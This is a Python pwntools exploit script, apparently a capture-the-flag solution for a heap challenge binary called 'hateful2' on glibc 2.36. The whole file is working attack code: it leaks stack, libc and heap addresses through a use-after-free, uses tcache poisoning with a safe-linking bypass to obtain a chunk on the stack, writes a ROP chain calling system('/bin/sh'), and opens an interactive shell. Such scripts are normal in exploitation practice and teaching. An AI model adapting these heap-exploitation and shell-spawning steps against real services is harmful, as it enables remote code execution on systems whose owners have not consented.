#!/usr/bin/env python3

from pwn import *

exe = ELF("./hateful2_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def about_us():
    p.sendlineafter(b'>> ', str(0))

def add_message(idx, size, data):
    p.sendlineafter(b'>> ', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'>> ', data)

def edit_message(idx, data):
    p.sendlineafter(b'>> ', str(2))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendafter(b'>> ', data)

def view_message(idx):
    p.sendlineafter(b'>> ', str(3))
    p.sendlineafter(b'Index: ', str(idx))

def remove_message(idx):
    p.sendlineafter(b'>> ', str(4))
    p.sendlineafter(b'Index: ', str(idx))

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x000000000000143F
            brva 0x0000000000001853
            c
            set follow-fork-mode parent
            ''')

# 2.36 not overwrite __free_hook

# Leak stack
about_us()
p.recvuntil(b'You can send up to ')
stack_leak = int(p.recvuntil(b' Messages!', drop=True).decode(), 10)
print("Stack leak: " + hex(stack_leak))

# Leak libc
add_message(0, 0x500, b'a'*8)
add_message(1, 0x10, b'b'*8)
remove_message(0)
view_message(0)

p.recvuntil(b'Message: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1d2cc0
print("Libc base: " + hex(libc.address))

# Leak heap
add_message(2, 0x30, b'c'*8)
add_message(3, 0x30, b'd'*8)
# 2 -> 3
remove_message(3)
remove_message(2)
view_message(3)

p.recvuntil(b'Message: ')
heap_leak = u64(p.recv(5) + b'\0'*3)
print("Heap leak: " + hex(heap_leak))
heap_base = heap_leak << 12
print("Heap base: " + hex(heap_base))

# Tcache Poisoning + Stack Pivot (Stack -> Stack not Stack -> global)
# 0xdeadbeef = (heap[3] >> 12) ^ x -> x = (heap[3] >> 12) ^ 0xdeadbeef
# target = stack_leak + 0x34
edit_message(2, p64(((heap_base + 0x2e0) >> 12) ^ (stack_leak + 0x2c)))

GDB()
add_message(2, 0x30, b'a'*8)
pop_rdi = 0x00000000000277e5 + libc.address
ret = 0x0000000000026e99 + libc.address
payload = b'a'*8 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
add_message(3, 0x30, payload)

p.sendlineafter(b'>> ', str(5))

p.interactive()